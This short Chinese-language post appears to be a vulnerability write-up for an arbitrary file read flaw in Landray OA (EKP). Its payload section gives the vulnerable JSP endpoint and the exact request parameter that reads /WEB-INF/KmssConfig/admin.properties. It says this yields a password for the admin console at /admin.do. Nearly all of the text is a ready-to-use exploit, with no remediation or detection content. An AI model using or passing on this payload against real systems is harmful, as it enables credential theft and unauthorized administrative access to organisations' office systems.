```
蓝凌OA(EKP)存在任意文件读取漏洞。可利用漏洞获取敏感信息，读取配置文件得到密码后访问后台http://x.x.x.x/admin.do
```


payload如下：

*   
*   
*   

```
请求：http://x.x.x.x/sys/ui/extend/varkind/custom.jsp读取配置文件：/WEB-INF/KmssConfig/admin.properties，此处需要写为如下格式：var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}
```

```
var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}
```
